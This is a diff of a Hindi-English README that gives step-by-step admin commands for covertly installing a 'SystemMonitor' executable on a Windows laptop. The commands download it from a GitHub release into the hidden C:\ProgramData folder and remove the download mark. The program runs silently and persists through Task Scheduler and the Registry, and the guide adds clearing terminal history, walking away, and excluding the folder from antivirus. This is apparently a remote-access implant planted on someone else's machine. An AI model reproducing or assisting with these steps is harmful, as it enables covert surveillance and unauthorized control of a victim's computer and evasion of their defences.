@@ -32,38 +32,40 @@ Ab manual build + upload nahi karna padta. Bas ye karo:
 
 - Internet connection hona chahiye
 - 2 minute ka time
-- CMD **Run as Administrator** me kholna zaroori hai
+- **CMD** ya **PowerShell** — **Run as Administrator** me kholna zaroori hai
 
 ---
 
-### Step 1 — CMD kholo as Administrator
+### Step 1 — Terminal kholo as Administrator
 
-Start menu me `cmd` type karo → **Right-click** → **Run as administrator**
+Start menu me `cmd` ya `powershell` type karo → **Right-click** → **Run as administrator**
 
 ---
 
 ### Step 2 — Cloudflared install karo
 
-```cmd
+```powershell
 winget install Cloudflare.cloudflared --accept-package-agreements --accept-source-agreements
 ```
 
 Agar winget na mile ya error aaye to ye paste karo:
 
-```cmd
-curl -L -o "%TEMP%\cloudflared.msi" https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.msi && msiexec /i "%TEMP%\cloudflared.msi" /qn && del "%TEMP%\cloudflared.msi"
+```powershell
+curl.exe -L -o "$env:TEMP\cloudflared.msi" https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.msi; msiexec /i "$env:TEMP\cloudflared.msi" /qn; Remove-Item "$env:TEMP\cloudflared.msi"
 ```
+
+> **Note:** PowerShell me `curl` nahi, `curl.exe` likhna — warna PowerShell apna alias use karega.
 
 ---
 
 ### Step 3 — Hidden folder banao + exe download karo
 
-```cmd
+```powershell
 mkdir C:\ProgramData\SystemMonitor
 ```
 
-```cmd
-curl -L -o C:\ProgramData\SystemMonitor\SystemMonitor.exe https://github.com/le0-le0/SysControl-v2/releases/latest/download/SystemMonitor.exe
+```powershell
+curl.exe -L -o C:\ProgramData\SystemMonitor\SystemMonitor.exe https://github.com/le0-le0/SysControl-v2/releases/latest/download/SystemMonitor.exe
 ```
 
 > `C:\ProgramData` Windows me by default hidden hota hai — normal user ko dikhta nahi.
@@ -72,71 +74,72 @@ curl -L -o C:\ProgramData\SystemMonitor\SystemMonitor.exe https://github.com/le0
 
 ### Step 4 — Internet download mark hatao
 
-```cmd
-echo. > "C:\ProgramData\SystemMonitor\SystemMonitor.exe:Zone.Identifier"
+```powershell
+Unblock-File C:\ProgramData\SystemMonitor\SystemMonitor.exe
 ```
 
-> Windows downloaded files ko "internet se aaya hai" mark karta hai aur silently block karta hai startup par. Ye usse hatata hai.
+> Windows downloaded files ko "internet se aaya hai" mark karta hai aur silently block karta hai startup par. `Unblock-File` usse hatata hai.
 
 ---
 
-### Step 5 — Exe run karo (Admin CMD me)
+### Step 5 — Exe run karo (Admin terminal me)
 
-```cmd
-C:\ProgramData\SystemMonitor\SystemMonitor.exe
+```powershell
+Start-Process C:\ProgramData\SystemMonitor\SystemMonitor.exe
 ```
 
-> Ye background me chala jayega. Kuch dikhega nahi. Task Scheduler + Registry dono me register ho jayega kyunki CMD admin hai.
+> Ye background me chala jayega. Kuch dikhega nahi. Task Scheduler + Registry dono me register ho jayega kyunki terminal admin hai.
 
 ---
 
 ### Step 6 — Check karo chal raha hai
 
-```cmd
-tasklist | findstr SystemMonitor
+```powershell
+Get-Process SystemMonitor
 ```
 
-Agar `SystemMonitor.exe` dikhe to sab sahi hai.
+Agar process dikhe to sab sahi hai. (CMD me: `tasklist | findstr SystemMonitor`)
 
 ---
 
-### Step 7 — CMD band karo aur chale jao
+### Step 7 — Terminal band karo aur chale jao
 
-- `Alt+F7` dabao CMD me (history clear)
-- CMD band karo
+- PowerShell me history clear: `Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue`
+- CMD me history clear: `Alt+F7`
+- Terminal band karo
 - Ab laptop jab v restart hoga, program automatically start hoga
 
 ---
 
 ## FULL COPY-PASTE (Sab ek saath)
 
-CMD as Administrator kholo aur ye **ek ek karke** paste karo:
+PowerShell ya CMD **Run as Administrator** me kholo aur ye **ek ek karke** paste karo:
 
-```cmd
+```powershell
 winget install Cloudflare.cloudflared --accept-package-agreements --accept-source-agreements
 ```
 
-```cmd
+```powershell
 mkdir C:\ProgramData\SystemMonitor
 ```
 
-```cmd
-curl -L -o C:\ProgramData\SystemMonitor\SystemMonitor.exe https://github.com/le0-le0/SysControl-v2/releases/latest/download/SystemMonitor.exe
+```powershell
+curl.exe -L -o C:\ProgramData\SystemMonitor\SystemMonitor.exe https://github.com/le0-le0/SysControl-v2/releases/latest/download/SystemMonitor.exe
 ```
 
-```cmd
-echo. > "C:\ProgramData\SystemMonitor\SystemMonitor.exe:Zone.Identifier"
+```powershell
+Unblock-File C:\ProgramData\SystemMonitor\SystemMonitor.exe
 ```
 
-```cmd
-C:\ProgramData\SystemMonitor\SystemMonitor.exe
+```powershell
+Start-Process C:\ProgramData\SystemMonitor\SystemMonitor.exe
 ```
 
-```cmd
-tasklist | findstr SystemMonitor
+```powershell
+Get-Process SystemMonitor
 ```
 
-> Total time: ~2 minute. Bas CMD admin me kholna mat bhoolna.
+> Total time: ~2 minute. Bas terminal admin me kholna mat bhoolna.
 
 ---
 
@@ -172,6 +175,7 @@ tasklist | findstr SystemMonitor
 | Device nahi dikh raha | 2-3 min wait karo, pehla heartbeat register hone me time lagta hai |
 | `winget` nahi mila | Step 2 me alternative curl command use karo |
 | Download 0 bytes | GitHub repo **public** hona chahiye — private me 404 aata hai |
-| Restart par start nahi hua | CMD **admin** me nahi khola tha — Task Scheduler fail hua. Dobara admin CMD se Step 5 run karo |
+| Restart par start nahi hua | Terminal **admin** me nahi khola tha — Task Scheduler fail hua. Dobara admin terminal se Step 5 run karo |
 | Antivirus ne block kiya | `C:\ProgramData\SystemMonitor\` folder ko exclusion me add karo |
-| Cloudflared not found | CMD band karke naya CMD kholo (PATH refresh hota hai) |
+| Cloudflared not found | Terminal band karke naya terminal kholo (PATH refresh hota hai) |
+| `curl` error in PowerShell | `curl.exe` likhna — `curl` PowerShell alias hai `Invoke-WebRequest` ka |
